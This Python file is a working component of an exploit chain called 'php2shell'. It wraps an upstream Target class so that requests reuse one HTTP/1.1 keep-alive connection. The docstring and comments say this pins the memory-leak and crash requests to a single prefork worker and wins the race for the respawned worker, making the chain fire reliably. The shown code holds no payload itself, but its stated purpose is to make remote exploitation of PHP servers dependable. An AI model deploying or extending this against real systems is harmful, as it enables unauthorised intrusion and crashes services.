#!/usr/bin/env python3
"""Keep-alive connection pinning for the php2shell chain.

On a multi-worker prefork server the published chain (Connection: close per
request) loses the OOM-aborted worker between request A and request B, so the
leak almost never fires. A persistent HTTP/1.1 connection pins both requests
to the same worker regardless of the worker count.
"""
from __future__ import annotations

import re
import socket
import ssl
import threading
import time


class KATarget:
    """Drop-in wrapper around an upstream Target that reuses one connection."""

    def __init__(self, inner):
        self.inner = inner
        self.sock = None
        self.lock = threading.Lock()

    def __getattr__(self, name):
        return getattr(self.inner, name)

    def _connect(self):
        inner = self.inner
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection((inner.host, inner.port),
                                             timeout=inner.timeout)
                if inner.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=inner.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def _reset(self):
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _read_response(self, s, timeout):
        s.settimeout(timeout)
        head = bytearray()
        while b"\r\n\r\n" not in head:
            chunk = s.recv(8192)
            if not chunk:
                raise ConnectionError("closed before headers")
            head.extend(chunk)
            if len(head) > 262144:
                raise ConnectionError("headers too large")
        head, _, rest = bytes(head).partition(b"\r\n\r\n")
        m = re.search(rb"(?i)\bcontent-length:\s*(\d+)", head)
        if m:
            need = int(m.group(1)) - len(rest)
            body = bytearray(rest)
            while need > 0:
                chunk = s.recv(min(need, 65536))
                if not chunk:
                    raise ConnectionError("closed mid-body")
                body.extend(chunk)
                need -= len(chunk)
            return bytes(head), bytes(body)
        if re.search(rb"(?i)\btransfer-encoding:\s*chunked", head):
            body = bytearray(rest)
            while not body.endswith(b"0\r\n\r\n"):
                chunk = s.recv(65536)
                if not chunk:
                    raise ConnectionError("closed mid-chunk")
                body.extend(chunk)
                if len(body) > (64 << 20):
                    raise ConnectionError("body too large")
            return bytes(head), bytes(body)
        # no framing info: treat as one-shot (connection will close)
        tail = bytearray()
        s.settimeout(2.0)
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                tail.extend(chunk)
        except OSError:
            pass
        self._reset()
        return bytes(head), bytes(rest) + bytes(tail)

    def request(self, method: str, path: str, body: bytes,
                content_type: str, read_cap: int = 1 << 20,
                timeout: float | None = None,
                extra_headers: dict[str, str] | None = None) -> tuple[bytes, bool]:
        """Send one request on the pinned connection. Returns (raw, alive)."""
        to = timeout or self.inner.timeout
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {self.inner.host}:{self.inner.port}\r\n"
            f"{extra}"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
        ).encode()
        with self.lock:
            if self.sock is None:
                self.sock = self._connect()
            try:
                self.sock.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    self.sock.sendall(mv[off:off + 262144])
            except OSError:
                self._reset()
                return b"", False
            try:
                head, body_out = self._read_response(self.sock, to)
                out = head + b"\r\n\r\n" + body_out
                if not body_out:
                    # The worker likely died mid-request (the chain's rotate /
                    # crash requests). Reconnect EAGERLY: on prefork the freshly
                    # respawned worker sits at the top of the LIFO idle stack,
                    # and the next connection to arrive claims it. Losing that
                    # race hands the fresh worker to background traffic.
                    self._reset()
                    try:
                        self.sock = self._connect()
                    except OSError:
                        pass
                return out, True
            except (OSError, ConnectionError):
                self._reset()
                try:
                    self.sock = self._connect()
                except OSError:
                    pass
                return b"", False

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        raw, _ = self.request("POST", self.inner.path, body,
                              f"multipart/form-data; boundary={boundary.decode()}",
                              read_cap, timeout, extra_headers)
        return raw

    def get(self, path: str, read_cap: int = 1 << 20):
        raw, _ = self.request("GET", path, b"", "application/x-www-form-urlencoded",
                              read_cap)
        head, _, body = raw.partition(b"\r\n\r\n")
        import re as _re
        m = _re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body
